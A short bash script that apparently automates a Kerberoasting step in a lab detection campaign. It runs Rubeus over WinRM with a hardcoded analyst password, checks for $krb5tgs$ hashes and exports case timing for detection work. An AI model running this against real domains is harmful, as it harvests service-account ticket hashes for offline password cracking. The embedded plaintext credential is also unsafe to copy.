#!/usr/bin/env bash
# T002 — Kerberoast from ws01 (analyst_t1 WinRM; intern_blue cred in-process for ACE#18)
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T002-KERB-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T002 | ${CASE_ID} | T0=${T0} ==="

ws01_ensure_rubeus
echo "--- Kerberoast via Rubeus using intern_blue credentials (AVOIDS double-hop / password reset) ---"
OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t002-kerb.ps1)"
printf '%s\n' "${OUT}"
if ! printf '%s' "${OUT}" | grep -qE '\$krb5tgs\$|Hashcat format'; then
  echo "T002_FAIL: no Kerberoast hash in Rubeus output" >&2
  exit 1
fi
echo "T002_OK"

cadre_export "${CASE_ID}" T002 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
